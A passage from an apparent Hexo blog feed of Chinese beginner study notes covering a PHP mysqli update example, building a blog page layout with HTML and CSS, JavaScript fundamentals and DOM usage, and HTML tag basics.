variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mydata"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//更新数据库的内容</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"update users set username='KKK'where id=1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token comment">//sql语句正确执行  输出新建成功</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">" Updated！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error update : "</span> <span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112623112.png" alt="image-20210712112623112"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210712112719484.png" alt="image-20210712112719484"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>60之day3</title>
      <link href="/2021/07/07/60-zhi-day3/"/>
      <url>/2021/07/07/60-zhi-day3/</url>
      
        <content type="html"><![CDATA[<h1 id="htmldivcss博客编写"><a href="#htmldivcss博客编写" class="headerlink" title="htmldivcss博客编写"></a>htmldivcss博客编写</h1><span id="more"></span><h2 id="博客网站设计和导航栏编写"><a href="#博客网站设计和导航栏编写" class="headerlink" title="博客网站设计和导航栏编写"></a>博客网站设计和导航栏编写</h2><p>在之前已经学习了html、div、css的基础知识，我们现在来做一个博客，找一个例子来模仿出来，如下这个例子</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708140457325.png" alt="image-20210708140457325"></p><h2 id="博客网站布局设计和导航栏的编写"><a href="#博客网站布局设计和导航栏的编写" class="headerlink" title="博客网站布局设计和导航栏的编写"></a>博客网站布局设计和导航栏的编写</h2><p>我们观察此博客，发现它分为3大部分，第一部分为导航栏headr；第二部分为中间主体main，main中又分为左(main-left)右(main-right)俩个部分；最后是底部footer部分。</p><p>这样我们首先需要5个div</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708140928651.png" alt="image-20210708140928651"></p><p>我们进行导航栏的编写，即header的编写：</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708141058547.png" alt="image-20210708141058547"></p><p>我们观察导航栏，发现它分为一个logo，一个无序列表(需要进行浮动),一个搜索框及按钮。</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708141240218.png" alt="image-20210708141240218"></p><blockquote><p>刚开始我们在html中的head和body中间新建style样式表，我们现在把他放在项目中的css中的style.css中</p></blockquote><p>关于他们的样式表如下：</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708141427409.png" alt="image-20210708141427409"></p><p><img src="/2021/07/07/60-zhi-day3/image-20210708141432371.png" alt="image-20210708141432371"></p><p>我们让他们左浮动即可横向排列，在加亿点细节即可。</p><h2 id="博客网站主体左边的制作"><a href="#博客网站主体左边的制作" class="headerlink" title="博客网站主体左边的制作"></a>博客网站主体左边的制作</h2><p><img src="/2021/07/07/60-zhi-day3/image-20210708141856473.png" alt="image-20210708141856473"></p><p>最底部还存在一个 <strong>点击查看更多</strong></p><p><img src="/2021/07/07/60-zhi-day3/image-20210708142029386.png" alt="image-20210708142029386"></p><p>我们观察网站主体的左边，将之分为若干个div即可，分别为一个main-lfet，一个最新文章a1，若干个article，一个更多文章a3。如下：</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708142140536.png" alt="image-20210708142140536"></p><p>其中article的规划如下：</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708142440317.png" alt="image-20210708142440317"></p><p>最外一个article，下分一个img和一个item-list，其中后者又分三部分，一个文章题目item-title，一个文章内容item-content，一个文章时间item-date，</p><p>最后我们再进行样式表的设计即可，需亿点细节</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708142711111.png" alt="image-20210708142711111"></p><p><img src="/2021/07/07/60-zhi-day3/image-20210708142732562.png" alt="image-20210708142732562"></p><h2 id="博客网站主体右边main-right制作"><a href="#博客网站主体右边main-right制作" class="headerlink" title="博客网站主体右边main-right制作"></a>博客网站主体右边main-right制作</h2><p>我们观察主体右边部分，先是四个div，近期文章、文档归档、俩个imgdiv，其中近期文章与归档类似，俩个img在div里挂上src即可</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708174340558.png" alt="image-20210708174340558"></p><p><img src="/2021/07/07/60-zhi-day3/image-20210708174434806.png" alt="image-20210708174434806"></p><p>接下来设计代码如下</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708174749717.png" alt="image-20210708174749717"></p><p>近期文章div里是，一个近期文章，下是无序列表</p><p>关于他们的样式表如下</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708174942890.png" alt="image-20210708174942890"></p><p><img src="/2021/07/07/60-zhi-day3/image-20210708174954976.png" alt="image-20210708174954976"></p><h2 id="博客网站主体底部footer的制作"><a href="#博客网站主体底部footer的制作" class="headerlink" title="博客网站主体底部footer的制作"></a>博客网站主体底部footer的制作</h2><p>我们观察博客</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708175135144.png" alt="image-20210708175135144"></p><p>上有四个4标签，鼠标滑过高亮；下一段文字，某些为a标签，滑过高亮</p><p>所以我们设计上面四个div a标签，下面一个p&gt;中间包含a标签即可，如下</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708175408201.png" alt="image-20210708175408201"></p><p>样式表如下</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708175431595.png" alt="image-20210708175431595"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此设计出一个简单的博客，这个过程中，发现设计博客真的是一个很耗费耐心的一件事，需要注意很多细节，不断地调试。</p><p>通过这次博客的设计，自己对html、div、css也是有了一个基本的应用，巩固所学吧</p><p>开发成果如下</p><p>红队技术、文章题目、近期文章中的文章题目、归档日期做了高亮</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708175659287.png" alt="image-20210708175659287"></p><p>底部某些做了高亮</p><p><img src="/2021/07/07/60-zhi-day3/image-20210708175744095.png" alt="image-20210708175744095"></p>]]></content>
      
      
      <categories>
          
          <category> 博客编写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> htmldivcss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/2021/07/06/60-zhi-day2/"/>
      <url>/2021/07/06/60-zhi-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a>JavaScript基础</h1><span id="more"></span><p>JavaScript是一门脚本语言，js不需要编译即可运行，运行在客户端，通过浏览器来解析执行JavaScript代码。</p><p>JavaScript被用来改进设计、验证表单、检测浏览器、创建cookies等，常用来修改html及css代码、验证表单</p><h2 id="嵌入方法"><a href="#嵌入方法" class="headerlink" title="嵌入方法"></a>嵌入方法</h2><p>内嵌式：写在head和body里</p><p>外链式：在一个文件类型为.js的文件里写入js语句，通过script标签引入到html页面中。 如：script src=”js文件路径地址”&gt;这里不能写js语句/script&gt;</p><p>行内式：直接写在标签身上，是一个简写的事件，又称为事件属性。 如：</p><p>input type=”button” value=”点我呀!” onclick=”alert(‘暗月渗透测试培训’);”&gt;</p><p>button onclick=”alert(‘恭喜你,加入暗月渗透测试培训’);”&gt;点我呀!/button&gt;</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>它是用来存储信息的容器</p><p>var K=’xiaoshaK’;</p><h2 id="JavaScript保留关键字"><a href="#JavaScript保留关键字" class="headerlink" title="JavaScript保留关键字"></a>JavaScript保留关键字</h2><p>JavaScript的保留关键字不能作为变量、标签或函数名</p><p><img src="/2021/07/06/60-zhi-day2/image-20210706201902289.png" alt="image-20210706201902289"></p><h2 id="JavaScript作用域"><a href="#JavaScript作用域" class="headerlink" title="JavaScript作用域"></a>JavaScript作用域</h2><p>JavaScript局域变量：在函数内声明，变量为局域作用域</p><p>JavaScript全局变量：在函数外声明，变量为全局作用域，网页中的所有脚本和函数都能使用</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>数值型：number（凡是数字都是数值型，不区分整数和小数）</li><li>字符串：string（凡是引号包裹起来的内容全部都是字符串）</li><li>布尔：boolean（true、false）</li><li>对象类型：object（特殊取值null）</li><li>未定义型：undefined</li><li>对象类型 数组 字典</li></ul><h3 id="数字型-number"><a href="#数字型-number" class="headerlink" title="数字型(number)"></a>数字型(number)</h3><p>只有一种数字类型-数字，它可以是整数，也可以是小数。</p><blockquote><p>以0开头 默认使用8进制来表示我的这个数字</p><p>以0x开头 默认使用16进制来表述我的这个数字</p><p>如果以-开头 默认为负数</p><p>如果带有e：以科学计数法来解析我的这个数字</p></blockquote><p>parseInt(..)   将某值转换成数字，不成功则NaN</p><p>parseFloat(..) 将某值转换成浮点数，不成功则NaN</p><p>特殊值：</p><p>NaN，非数字。可使用 isNaN(num) 来判断。</p><p>Infinity，无穷大。可使用 isFinite(num) 来判断。</p><h3 id="字符串类型-string"><a href="#字符串类型-string" class="headerlink" title="字符串类型(string)"></a>字符串类型(string)</h3><blockquote><p>obj.length              长度</p><p>obj.trim()              移除空白</p><p>obj.trimLeft()</p><p>obj.trimRight)</p><p>obj.charAt(n)             返回字符串中的第n个字符</p><p>obj.concat(value, …)        拼接</p><p>obj.indexOf(substring,start)     子序列位置</p><p>obj.lastIndexOf(substring,start)   子序列位置</p><p>obj.substring(from, to)        根据索引获取子序列</p><p>obj.slice(, end)         切片</p><p>obj.toLowerCase()           大写</p><p>obj.toUpperCase()           小写</p><p>obj.split(delimiter, limit)      分割</p><p>。。。等</p></blockquote><h3 id="布尔类型-boolean"><a href="#布尔类型-boolean" class="headerlink" title="布尔类型(boolean)"></a>布尔类型(boolean)</h3><p>布尔类型只有true或者false</p><p>一般用来说明真假</p><h3 id="null空"><a href="#null空" class="headerlink" title="null空"></a>null空</h3><p>表示变量为空值，用来定义空或者是不存在的引用。</p><p>null不等于””或0</p><h3 id="undefined未定义"><a href="#undefined未定义" class="headerlink" title="undefined未定义"></a>undefined未定义</h3><p>表示变量不含有值，没有定义的值，或者被定义了一个不存在的属性值</p><blockquote><p>！null和undefined区别：</p><p>null它表示一个变量被赋予一个空值，而undefined是表示变量还没有被赋值</p></blockquote><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>1、var arr=[]//定义一个空数组</p><p>2、var arr=[10,20,{“name”:”tomy”,”age”:19},0.1,”string”,true,[“aaa”,”bbb”]]//定义的同时赋值</p><p>3、var arr=new Array();//定义一个空数组</p><p>4、var arr = new Array(10,20,{“name”:”tomy”,”age”:19},0.1,”string”,true,[“aaa”,”bbb”])//定义的同时赋值</p><p>5、var arr=new Array(10)//定义一个长度为10的数组</p><blockquote><p>操作：</p><p>obj.length      数组的大小</p><p>obj.push(ele)    尾部追加元素</p><p>obj.pop()      尾部获取一个元素</p><p>obj.unshift(ele)   头部插入元素</p><p>obj.shift()     头部移除元素</p><p>obj.splice(start, deleteCount, value, …)  插入、删除或替换数组的元素</p><p>​          obj.splice(n,0,val) 指定位置插入元素</p><p>​          obj.splice(n,1,val) 指定位置替换元素</p><p>​          obj.splice(n,1)   指定位置删除元素</p><p>obj.slice( )     切片</p><p>obj.reverse( )    反转</p><p>obj.join(sep)    将数组元素连接起来以构建一个字符串</p><p>obj.concat(val,..)  连接数组</p><p>obj.sort( )     对数组元素进行排序</p></blockquote><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>普通函数：</p><p>function func(arg){</p><p>​    return arg+1;</p><p>​        }</p><p>​    var result = func(1);</p><p>​    console.log(result);        var result = func(1);</p><p>​    console.log(result);</p><p>匿名函数（没有名字的函数称为匿名函数）</p><p>setInterval(function(){</p><p>​        console.log(123);</p><p>},500)</p><p>自执行函数（创建函数并且自动执行）</p><p>(function(arg){</p><p>​    console.log(arg);</p><p>})(1);</p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>是一种以键值对形式存储数据的数据结构</p><blockquote><p>var dict = {‘k1’:”moonsec”,’k2’:’moon’,’age’:18};</p><p>输出字典元素</p><p>for(var item in dict){</p><p>console.log(dict[item]);</p><p>}</p><p>获取指定元素</p><p>dict[‘age’] 获取key为age的元素</p><p>赋值</p><p>dict[‘age’]=10</p><p>删除元素</p><p>delete dict[‘one’];</p><p>delete dict.age;</p></blockquote><h2 id="js的序列化和反序列化"><a href="#js的序列化和反序列化" class="headerlink" title="js的序列化和反序列化"></a>js的序列化和反序列化</h2><blockquote><p>把对象转为字符串</p><p>JSON.stringify()</p><p>把字符串转为数组</p><p>newli = JSON.parse()</p></blockquote><p>序列化即将js中的object转换为字符串</p><p>使用toJSONString</p><p>var last=obj.toJSONString(); //将JSON对象转化为JSON字符  </p><p>使用stringify</p><p> var last=JSON.stringify(obj); //将JSON对象转化为JSON字符  </p><p>反序列化 即js中JSON字符串转化为Object</p><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><ul><li>decodeURI( )          URl中未转义的字符</li><li>decodeURIComponent( )  URI组件中的未转义字符</li><li>encodeURI( )          URI中的转义字符</li><li>encodeURIComponent( )  转义URI组件中的字符</li><li>escape( )             对字符串转义</li><li>unescape( )           给转义字符串解码</li><li>URIError             由URl的编码和解码方法抛出</li></ul><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>此函数可以计算执行某个字符串，并执行其中的js代码</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>+  -  *  /  %  ++  –</p><p>字符串拼接使用“+”</p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>&lt;</p><p>&gt;</p><p>==</p><p>！=</p><p>&lt;=</p><p>&gt;=</p><p>=== 全等于：将数值以及数据类型一并比较</p><p>！==不全等于：将数值以及数据类型一并比较</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>=</p><p>+= </p><p>-=</p><p>*=</p><p>/=</p><p>%=</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>&amp;&amp;  全真为真</p><p>||  一个为真就是真</p><p>！  取反</p><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><p>表达式1?表达式2:表达式3</p><p>当我的表达式1成立时  执行表达式2  否则执行表达式3</p><blockquote><p>var max = 2&gt;1?’&gt;’:’&lt;’;</p><p>console.log(max);</p></blockquote><h2 id="js操作DOM"><a href="#js操作DOM" class="headerlink" title="js操作DOM"></a>js操作DOM</h2><p>DOM(document object model)文档对象模型，是针对HTML和XML的一个API(应用程序接口)。DOM给我们描述了一个具有层次化特点的节点树，允许开发人员增删改查页面的某些部分。</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707130345256.png" alt="image-20210707130345256"></p><ul><li>JavaScript 能够改变页面中的所有 HTML 元素</li><li>JavaScript 能够改变页面中的所有 HTML 属性</li><li>JavaScript 能够改变页面中的所有 CSS 样式</li><li>JavaScript 能够对页面中的所有事件做出反应</li></ul><h2 id="DOM查找元素"><a href="#DOM查找元素" class="headerlink" title="DOM查找元素"></a>DOM查找元素</h2><p>document获取节点的基本方法</p><ul><li>document.getElementById(‘id’);  //通过id来获取元素,返回指定的唯一元素。</li><li>document.getElementsByName(“name”); //通过name来获取元素，返回name=’name’的集合。</li><li>.document.getElementsByClassName(“classname”)  //用classname来获取元素，返回的是一个class=”classname”的集合(不兼容IE8及以下)。</li><li>document.getElementsByTagName(‘div’); //用元素的标签获取元素，返回所有标签=“div”的集合。</li></ul><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><strong>直接查找：</strong></p><p>var obj = document.getElementById(‘id’);</p><p><strong>间接查找：</strong></p><p>文件内容操作：</p><p>innerText 仅文本</p><p>innerHTML 全内容</p><p>value：</p><p>input value 获取当前的值</p><p>select 获取选中的value的值 document.getElementById(‘s1’).selectedIndex=1</p><p>Textarea 获取value的值</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><strong>样式操作：</strong></p><p>className 列出样式 字符串</p><p>classList 列出样式 返回数组</p><p>​    classList.add 增加样式</p><p>​    classList.remove 删除样式</p><p>div class=’c1 c2’ styple=’font-size:16px’&gt;/div&gt;</p><p>obj.style.fontSize=’16px’;</p><p><strong>属性操作：</strong></p><p>获取属性：getAttribute() </p><p>添加属性：setAttribute(‘xxx’,’alexe’)</p><p>删除属性：removeAttribute(value)</p><h2 id="创建标签并添加到html中"><a href="#创建标签并添加到html中" class="headerlink" title="创建标签并添加到html中"></a>创建标签并添加到html中</h2><h3 id="字符串方式"><a href="#字符串方式" class="headerlink" title="字符串方式"></a>字符串方式</h3><p>insertAdjacentHTML()</p><p>四种值可用：</p><ul><li>beforeBegin: 插入到标签开始前</li><li>afterBegin:插入到标签开始标记之后</li><li>beforeEnd:插入到标签结束标记前</li><li>afterEnd:插入到标签结束标记后</li></ul><p><img src="/2021/07/06/60-zhi-day2/image-20210707131708654.png" alt="image-20210707131708654"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707131603620.png" alt="image-20210707131603620"></p><h3 id="对象的方式"><a href="#对象的方式" class="headerlink" title="对象的方式"></a>对象的方式</h3><p>document.createElement</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707131456693.png" alt="image-20210707131456693"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707131503878.png" alt="image-20210707131503878"></p><h2 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h2><p>任何标签都能通过DOM提交</p><p>getElementById(‘id’).submit()</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>console.log 终端输出</p><p>alert 弹出框</p><p>confirm 确认框 标题 true false</p><p>url和刷新</p><p>location.href  获取url</p><p>location.href =’url’ 重定向</p><p>location.reload() 重新加载</p><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><p>setInterval()</p><p>clearInterval()</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707131922787.png" alt="image-20210707131922787"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707131934995.png" alt="image-20210707131934995"></p><p>时间一直变化 点击停止后停止</p><p>只执行一次</p><p>setTimeout()</p><p>clearTimeout()</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132155723.png" alt="image-20210707132155723"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132204884.png" alt="image-20210707132204884"></p><p>点击删除后显示已删除，5s后还原</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132231316.png" alt="image-20210707132231316"></p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>绑定事件两种方式：</p><ol><li><p>直接标签绑定 onclick=’’，将事件写在标签里</p></li><li><p>先获取dom对象，然后进行绑定</p><p>document.getElementById(‘xxx’).onclick()</p></li></ol><h2 id="js应用之走马灯"><a href="#js应用之走马灯" class="headerlink" title="js应用之走马灯"></a>js应用之走马灯</h2><p><img src="/2021/07/06/60-zhi-day2/image-20210707132520494.png" alt="image-20210707132520494"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132544678.png" alt="image-20210707132544678"></p><p>做到了字体跑起来的效果</p><h2 id="js应用之搜索框"><a href="#js应用之搜索框" class="headerlink" title="js应用之搜索框"></a>js应用之搜索框</h2><p><img src="/2021/07/06/60-zhi-day2/image-20210707132640467.png" alt="image-20210707132640467"></p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132651534.png" alt="image-20210707132651534"></p><p>鼠标点击输入区域后，提示输入消失</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132706911.png" alt="image-20210707132706911"></p><p>鼠标失去焦点后，提示输入再次出现</p><p><img src="/2021/07/06/60-zhi-day2/image-20210707132804956.png" alt="image-20210707132804956"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html&amp;divcss基础</title>
      <link href="/2021/07/05/60-zhi-day1/"/>
      <url>/2021/07/05/60-zhi-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="html基础"><a href="#html基础" class="headerlink" title="html基础"></a>html基础</h1><span id="more"></span><h2 id="html结构："><a href="#html结构：" class="headerlink" title="html结构："></a>html结构：</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="meta标签："><a href="#meta标签：" class="headerlink" title="meta标签："></a>meta标签：</h3><p>提供有关页面的元信息，比如针对搜索引擎和更新频度的描述和关键字，设置网站关键字等</p><h3 id="标题标签："><a href="#标题标签：" class="headerlink" title="标题标签："></a>标题标签：</h3><p>1级标题。。。</p><p>br换行</p><p>hr换行线</p><h3 id="文本属性："><a href="#文本属性：" class="headerlink" title="文本属性："></a>文本属性：</h3><blockquote><p>&lt;strong&gt;/strong&gt; 加粗</p><p>&lt;b&gt;&lt;/b&gt; 加粗</p><p>&lt;i&gt;&lt;/i&gt; 斜体</p><p>&lt;u&lt;/u&gt; 下划线</p><p>&lt;sup&gt;&lt;/sup&gt; 上标</p><p>&lt;sub&gt;&lt;/sub&gt; 下标</p><p>&lt;del&gt;&lt;/del &gt; 删除线</p><p>&lt;font&gt;&lt;/font &gt; 规定字体属性</p><p>​    size 字体的大小</p><p>​    color  字体颜色</p></blockquote><h3 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h3><blockquote><p> 规定当提交表单时向何处发送表单数据：</p><p>method 提交的方法有 get、post</p></blockquote><blockquote><p>规定在发送表单数据之前如何对其进行编码</p><p>enctype 属性可能的值</p><p>​        application/x-www-form-urlencoded</p><p>​        multipart/form-data</p><p>​        text/plain</p></blockquote><h3 id="input标签："><a href="#input标签：" class="headerlink" title="input标签："></a>input标签：</h3><ul><li>name：同样是表示的该文本输入框名称。</li><li>size：输入框的长度大小。</li><li>maxlength：输入框中允许输入字符的最大数。</li><li>value：输入框中的默认值</li><li>readonly：表示该框中只能显示，不能添加修改。</li></ul><p>input的类型</p><ul><li>type=password  密码输入框</li><li>type=file 文件上传</li><li>type=hidden 隐藏域</li><li>button 按钮</li><li>checkbox 复选框</li><li>radio 单选框</li><li>type=submit 提交按钮</li><li>type=reset  重置按钮</li></ul><h3 id="a标签："><a href="#a标签：" class="headerlink" title="a标签："></a>a标签：</h3><p>用于控制界面与页面之间的跳转 默认为self</p><ul><li>_blank    在新窗口中打开被链接文档。</li><li>_self    默认。在相同的框架中打开被链接文档。</li><li>_parent    在父框架集中打开被链接文档。</li><li>_top    在整个窗口中打开被链接文档</li></ul><h3 id="锚文本："><a href="#锚文本：" class="headerlink" title="锚文本："></a>锚文本：</h3><p>可以用来返回顶部等位置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>锚点<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>锚点<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="img标签："><a href="#img标签：" class="headerlink" title="img标签："></a>img标签：</h3><p>img 元素向网页中嵌入一幅图像</p><p>img src=”/i/eg_tulip.jpg” &nbsp;alt=”上海鲜花港 - 郁金香” /&gt;</p><ul><li>alt 规定图像的替代文本。</li><li>src  规定显示图像的url</li><li>width 规定图片的高度</li><li>height 规定图片的宽度</li></ul><h3 id="table表格："><a href="#table表格：" class="headerlink" title="table表格："></a>table表格：</h3><blockquote><p>caption&gt;我的标题/caption&gt;表格带标题</p><p>border 边框</p><p>width 宽度</p><p>height 高度</p><p>colspan 行</p><p>rowspan 竖</p><p>th&gt;/th&gt;</p><p>tr&gt;行/tr&gt;</p><p>td&gt;表格/td&gt;</p><p>cellpadding 单元边与内容的空白</p><p>cellspacing 单元格的空白</p></blockquote><h3 id="列表标签："><a href="#列表标签：" class="headerlink" title="列表标签："></a>列表标签：</h3><p>无序列表：</p><blockquote><p>ul&gt;</p><p>​    li&gt;/li&gt;</p><p>​    li&gt;/li&gt;</p><p>​    li&gt;/li&gt;</p><p>​    li&gt;/li&gt;</p><p>/ul&gt;</p></blockquote><p>有序列表： 默认 数字</p><p>​    小写字母列表 a</p><p>​    大写字母列表 A</p><p>​    罗马字母列表  I</p><p>​    小写罗马字母列表 i</p><blockquote><p>ol type=”1”&gt; </p><p>​            li&gt;暗月实战项目九 不出网的情况下的内网多域控渗透/li&gt;</p><p>​            li&gt;xp/2003开关3389指令/li&gt;</p><p>​            li&gt;一条命令修改windows注册表/li&gt;</p><p>/ol&gt;</p></blockquote><h3 id="框架使用："><a href="#框架使用：" class="headerlink" title="框架使用："></a>框架使用：</h3><p>framset:在一个页面设置一个或多个框架，不能放在body里</p><p>scrolling  滚动条</p><ul><li>auto    在需要的情况下出现滚动条（默认值）。</li><li>yes    始终显示滚动条（即使不需要）。</li><li>no    从不显示滚动条（即使需要）</li></ul><p><img src="/2021/07/05/60-zhi-day1/image-20210705211457435.png" alt="image-20210705211457435"></p><p><img src="/2021/07/05/60-zhi-day1/image-20210705211645244.png" alt="image-20210705211645244"></p><h1 id="divcss基础"><a href="#divcss基础" class="headerlink" title="divcss基础"></a>divcss基础</h1><blockquote><p> 